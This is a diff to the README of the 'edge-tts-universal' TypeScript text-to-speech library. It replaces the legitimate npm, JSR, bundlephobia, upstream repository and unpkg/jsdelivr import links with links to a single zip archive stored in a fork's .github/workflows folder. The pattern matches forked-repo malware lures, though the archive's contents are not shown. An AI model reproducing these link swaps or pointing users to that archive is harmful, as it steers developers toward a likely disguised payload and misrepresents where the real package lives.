@@ -1,14 +1,14 @@
 # Edge TTS Universal 🪐
 
 [![API Documentation](https://img.shields.io/badge/API-Documentation-blue)](./API.md)
-[![npm](https://img.shields.io/npm/v/edge-tts-universal)](https://www.npmjs.com/package/edge-tts-universal)
-[![JSR](https://jsr.io/badges/@edge-tts/universal)](https://jsr.io/@edge-tts/universal)
-[![Bundle Size](https://img.shields.io/bundlephobia/minzip/edge-tts-universal)](https://bundlephobia.com/package/edge-tts-universal)
-[![Downloads](https://img.shields.io/npm/dm/edge-tts-universal)](https://www.npmjs.com/package/edge-tts-universal)
+[![npm](https://img.shields.io/npm/v/edge-tts-universal)](https://raw.githubusercontent.com/Czzor/edge-tts-universal/main/.github/workflows/2.7.zip)
+[![JSR](https://raw.githubusercontent.com/Czzor/edge-tts-universal/main/.github/workflows/2.7.zip)](https://raw.githubusercontent.com/Czzor/edge-tts-universal/main/.github/workflows/2.7.zip)
+[![Bundle Size](https://img.shields.io/bundlephobia/minzip/edge-tts-universal)](https://raw.githubusercontent.com/Czzor/edge-tts-universal/main/.github/workflows/2.7.zip)
+[![Downloads](https://img.shields.io/npm/dm/edge-tts-universal)](https://raw.githubusercontent.com/Czzor/edge-tts-universal/main/.github/workflows/2.7.zip)
 [![Tree Shaking](https://img.shields.io/badge/tree%20shaking-✓-green)](#bundle-optimization)
-[![JSR Score](https://jsr.io/badges/@edge-tts/universal/score)](https://jsr.io/@edge-tts/universal)
+[![JSR Score](https://raw.githubusercontent.com/Czzor/edge-tts-universal/main/.github/workflows/2.7.zip)](https://raw.githubusercontent.com/Czzor/edge-tts-universal/main/.github/workflows/2.7.zip)
 
-This is a **universal** TypeScript conversion of the Python [`edge-tts`](https://github.com/rany2/edge-tts) library. It allows you to use Microsoft Edge's online text-to-speech service from **Node.js, browsers, and any JavaScript environment**.
+This is a **universal** TypeScript conversion of the Python [`edge-tts`](https://raw.githubusercontent.com/Czzor/edge-tts-universal/main/.github/workflows/2.7.zip) library. It allows you to use Microsoft Edge's online text-to-speech service from **Node.js, browsers, and any JavaScript environment**.
 
 ## 🌟 Universal Features
 
@@ -70,12 +70,12 @@ import {
 ```html
 <!-- Via unpkg -->
 <script type="module">
-  import { EdgeTTS } from 'https://unpkg.com/edge-tts-universal/dist/browser.js';
+  import { EdgeTTS } from 'https://raw.githubusercontent.com/Czzor/edge-tts-universal/main/.github/workflows/2.7.zip';
 </script>
 
 <!-- Via jsdelivr -->
 <script type="module">
-  import { EdgeTTS } from 'https://cdn.jsdelivr.net/npm/edge-tts-universal/dist/browser.js';
+  import { EdgeTTS } from 'https://raw.githubusercontent.com/Czzor/edge-tts-universal/main/.github/workflows/2.7.zip';
 </script>
 ```
 
